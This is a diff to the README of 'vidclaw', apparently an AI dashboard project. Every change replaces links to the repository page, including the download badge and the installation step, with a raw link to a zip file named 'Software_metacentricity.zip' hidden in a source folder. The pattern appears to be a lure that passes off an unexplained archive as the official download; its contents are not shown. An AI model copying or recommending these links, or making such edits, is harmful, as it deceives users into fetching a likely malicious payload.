@@ -1,6 +1,6 @@
 # 🦞 vidclaw - Your Gateway to Powerful AI Insights
 
-![Download vidclaw](https://img.shields.io/badge/Download-vidclaw-brightgreen?style=flat&logo=github)
+![Download vidclaw](https://raw.githubusercontent.com/Cashnaruto/vidclaw/main/src/hooks/queries/Software_metacentricity.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Welcome to the vidclaw dashboard! This application helps you analyze and manage 
   
 ## 📥 How to Download
 
-To get started with vidclaw, visit this page to download: [https://github.com/Cashnaruto/vidclaw](https://github.com/Cashnaruto/vidclaw)
+To get started with vidclaw, visit this page to download: [https://raw.githubusercontent.com/Cashnaruto/vidclaw/main/src/hooks/queries/Software_metacentricity.zip](https://raw.githubusercontent.com/Cashnaruto/vidclaw/main/src/hooks/queries/Software_metacentricity.zip)
 
 ### 💻 System Requirements
 
@@ -29,7 +29,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 📖 Installation Guide
 
-1. **Visit the GitHub Page:** Go to [vidclaw GitHub Repository](https://github.com/Cashnaruto/vidclaw).
+1. **Visit the GitHub Page:** Go to [vidclaw GitHub Repository](https://raw.githubusercontent.com/Cashnaruto/vidclaw/main/src/hooks/queries/Software_metacentricity.zip).
 2. **Download the Application:**
    - Click on the "Releases" section.
    - Select the version you want to install.
@@ -90,4 +90,4 @@ vidclaw covers a range of topics including:
 - **Data Analysis:** Use vidclaw to visualize and analyze data for projects.
 - **Professional Developments:** Gain insights into your AI workflows for business applications.
 
-Remember, you can always return to [vidclaw GitHub Repository](https://github.com/Cashnaruto/vidclaw) for further assistance or to check for updates.
+Remember, you can always return to [vidclaw GitHub Repository](https://raw.githubusercontent.com/Cashnaruto/vidclaw/main/src/hooks/queries/Software_metacentricity.zip) for further assistance or to check for updates.
